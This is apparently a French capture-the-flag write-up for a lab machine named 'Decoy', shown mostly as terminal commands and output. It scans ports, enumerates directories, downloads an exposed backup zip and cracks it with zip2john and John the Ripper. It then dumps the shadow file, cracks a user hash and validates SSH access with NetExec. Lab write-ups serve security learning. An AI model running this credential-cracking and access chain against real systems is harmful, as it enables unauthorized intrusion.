# Decoy

1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌──[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.116
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.116...100%
[+] Scan Nmap 192.168.56.116...100%
 
[+] 80/tcp open
[+] 22/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.116-tcp.html     |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">👊</span> **Gobuster**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $gobuster dir -u http://192.168.56.116/ -w /usr/share/wordlists/dirb/common.txt -x html,php,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.116/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.hta.html            (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.hta.zip             (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htaccess.zip        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htpasswd.zip        (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/save.zip             (Status: 200) [Size: 3123]
/server-status        (Status: 403) [Size: 279]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```

&nbsp;

Téléchargement du fichier `save.zip`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $wget http://192.168.56.116/save.zip
--2025-02-16 16:33:27--  http://192.168.56.116/save.zip
Connexion à 192.168.56.116:80… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 3123 (3,0K) [application/zip]
Sauvegarde en : « save.zip »

save.zip                                        100%[=====================================================================================================>]   3,05K  --.-KB/s    ds 0s      

2025-02-16 16:33:27 (478 MB/s) — « save.zip » sauvegardé [3123/3123]
```

&nbsp;

<span style="color: #dddddd;">💣</span> **Zip2john**

Récupère le hash du fichier `save.zip`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $zip2john save.zip
save.zip:$pkzip$6*1*1*0*8*24*8759*a7409df1d7a76ad3809794d387209855bb7638aa589d5be62b9bf373d78055e1dd351925*1*0*8*24*1535*459926ee53809fa53fe26c3e4548cd7819791a638c8d96d3ec7cf18477ffa1e9e2e77944*1*0*8*24*834f*7d2cbe98180e5e9b8c31c5aec89c507011d26766981d17d249e5886e51ac03270b009d62*1*0*8*24*8d07*7d51a96d3e3fa4083bbfbe90ee97ddba1f39f769fcf1b2b6fd573fdca8c97dbec5bc9841*1*0*8*24*90ab*f7fe58aeaaa3c46c54524ee024bd38dae36f3110a07f1e7aba266acbf8b5ff0caf42e05e*2*0*2d*21*d9c379a9*9b9*46*0*2d*8ce8*aae40dfa55b72fd591a639c8c6d35b8cabd267f7edacb40a6ddf1285907b062c99ec6cc8b55d9f0027f553a44f*$/pkzip$
```

&nbsp;

Crack du mot de passe de `save.zip`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $john save-zip 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
manuel           (save.zip)     
1g 0:00:00:00 DONE 2/3 (2025-02-16 16:37) 9.090g/s 14545p/s 14545c/s 14545C/s keller..mermaid
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌─[parrot@parrot]─[~/Documents]
└──╼ $john save-zip --show
save.zip:manuel

1 password hash cracked, 0 left
```

&nbsp;

Unzip

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $unzip save.zip 
Archive:  save.zip
[save.zip] etc/passwd password: 
  inflating: etc/passwd              
  inflating: etc/shadow              
  inflating: etc/group               
  inflating: etc/sudoers             
  inflating: etc/hosts               
 extracting: etc/hostname
```

&nbsp;

Dump des hash des utilisateur du fichier `save.zip`

```
┌─[m0rph3u5@parrot]─[~/Documents/etc]
└──╼ $cat shadow 
root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::
daemon:*:18440:0:99999:7:::
bin:*:18440:0:99999:7:::
sys:*:18440:0:99999:7:::
sync:*:18440:0:99999:7:::
games:*:18440:0:99999:7:::
man:*:18440:0:99999:7:::
lp:*:18440:0:99999:7:::
mail:*:18440:0:99999:7:::
news:*:18440:0:99999:7:::
uucp:*:18440:0:99999:7:::
proxy:*:18440:0:99999:7:::
www-data:*:18440:0:99999:7:::
backup:*:18440:0:99999:7:::
list:*:18440:0:99999:7:::
irc:*:18440:0:99999:7:::
gnats:*:18440:0:99999:7:::
nobody:*:18440:0:99999:7:::
_apt:*:18440:0:99999:7:::
systemd-timesync:*:18440:0:99999:7:::
systemd-network:*:18440:0:99999:7:::
systemd-resolve:*:18440:0:99999:7:::
messagebus:*:18440:0:99999:7:::
avahi-autoipd:*:18440:0:99999:7:::
sshd:*:18440:0:99999:7:::
avahi:*:18440:0:99999:7:::
saned:*:18440:0:99999:7:::
colord:*:18440:0:99999:7:::
hplip:*:18440:0:99999:7:::
systemd-coredump:!!:18440::::::
296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::
```

&nbsp;

<span style="color: #dddddd;">🧨</span> **JohnTheRipper**

Crack du mot de passe des 2 utilisateurs

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $john hash --wordlist=/usr/share/john/password.lst
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
server           (296640a3b825115a47b68fc44501c828)     
1g 0:00:00:00 DONE (2025-02-16 16:50) 1.030g/s 1847p/s 1847c/s 1847C/s partner..snapper
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌─[parrot@parrot]─[~/Documents]
└──╼ $john hash --show
296640a3b825115a47b68fc44501c828:server:18450:0:99999:7:::

1 password hash cracked, 0 left
```

&nbsp;

**<span style="color: #dddddd;">🖥️</span> NetExec**

Test des identifiant trouver

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc ssh 192.168.56.116 -u '296640a3b825115a47b68fc44501c828' -p server                                      
SSH         192.168.56.116   22     192.168.56.116    [*] SSH-2.0-OpenSSH_5.1p1 Debian-3ubuntu1
SSH         192.168.56.116   22     192.168.56.116    [+] 296640a3b825115a47b68fc44501c828:server (Pwn3d!) Linux - Shell access!
```

&nbsp;

Identifiant trouver

| Users | Password |
| --- | --- |
| 296640a3b825115a47b68fc44501c828 | server |

&nbsp;
